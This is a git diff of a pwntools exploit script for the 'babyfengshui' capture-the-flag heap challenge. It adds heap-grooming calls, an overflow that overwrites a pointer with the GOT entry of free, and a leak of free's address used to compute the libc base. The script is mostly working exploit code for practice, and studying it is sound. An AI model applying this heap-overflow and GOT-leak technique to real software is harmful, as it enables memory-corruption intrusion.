@@ -6,9 +6,12 @@ from pwn import *
 import re
 
 b = ELF('./babyfengshui')
-clib = ELF('/lib/i386-linux-gnu/libc.so.6')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
 r = process('./babyfengshui')
+
+def hex_dump(s):
+    return ":".join("{:02x}".format(ord(c)) for c in s)
 
 def recv_all():
     b = ""
@@ -25,22 +28,46 @@ def recv_all():
 def snd(s):
     r.send(s)
 
-def add(size_desc, desc, size_text, text):
+#
+# p = malloc(size_desc)
+# p2 = malloc(128)                  // [ptr][name]
+# *p2 = p
+# fgets((char *)p2 + 4, 124)        // name
+#
+def add(size_desc, name, len_desc, desc):
     snd('0\n')
     r.recvuntil('size of description: ')
     snd(str(size_desc) + '\n')
     r.recvuntil('name: ')
-    snd(desc + '\n')
+    snd(name + '\n')
     r.recvuntil('text length: ')
-    snd(str(size_text) + '\n')
+    snd(str(len_desc) + '\n')
     r.recvuntil('text: ')
-    snd(text + '\n')
+    snd(desc + '\n')
     r.recvuntil('Action: ')
 
+#
+# free(*(void **)g_player_tbl[idx])
+# free(g_player_tbl[idx])
+#
 def delete(idx):
     snd('1\n')
     r.recvuntil('index: ')
     snd(str(idx) + '\n')
+    r.recvuntil('Action: ')
+
+#
+# if ( p + len_text >= p2 - 4 ) error();
+# fgets(*(char **)g_player_tbl[idx], len_text + 1)
+#
+def update(idx, len_desc, desc):
+    snd('3\n')
+    r.recvuntil('index: ')
+    snd(str(idx) + '\n')
+    r.recvuntil('text length: ')
+    snd(str(len_desc) + '\n')
+    r.recvuntil('text: ')
+    snd(desc + '\n')
     r.recvuntil('Action: ')
 
 def display(idx):
@@ -49,19 +76,8 @@ def display(idx):
     snd(str(idx) + '\n')
     resp = recv_all()
     print resp
-    name = re.findall(r"name: (.+)", resp)[0]
     desc = re.findall(r"description: (.+)", resp)[0]
-    return (name, desc)
-
-def update(idx, size_text, text):
-    snd('3\n')
-    r.recvuntil('index: ')
-    snd(str(idx) + '\n')
-    r.recvuntil('text length: ')
-    snd(str(size_text) + '\n')
-    r.recvuntil('text: ')
-    snd(text + '\n')
-    r.recvuntil('Action: ')
+    return desc
 
 if __name__ == "__main__":
 
@@ -69,10 +85,29 @@ if __name__ == "__main__":
 
     r.settimeout(0.5)
 
-    add(100,'babo',50,'haha')
-    print display(0)
+    #
+    # Objective:
+    #
+    # *g_player_tbl[a1] = GOT of free
+    #
 
-    update(0,10,'haha2')
-    print display(0)
-
-    r.interactive()
+    add(24, 'AAAA', 4, 'BBBB')
+    add(24, 'CCCC', 4, 'DDDD')
+    add(24, 'EEEE', 4, 'FFFF')
+    raw_input('after adding 3 items...')
+    #delete(0)
+    delete(1)
+    #delete(2)
+    raw_input('after deleting 3 items...')
+    add(128, 'GGGG', 4, 'HHHH')
+    raw_input('after adding 1 item...')
+    update(3, 168+4, 'X'*168+p32(b.got['free']))
+    
+    l = display(2)
+    print hex_dump(l)
+    l = l[0:4]
+    l = u32(l)
+    log.info('GOT of free: 0x%x' % l)
+    
+    libc_base = l - libc.symbols['free']
+    log.info('libc: 0x%x' % libc_base)
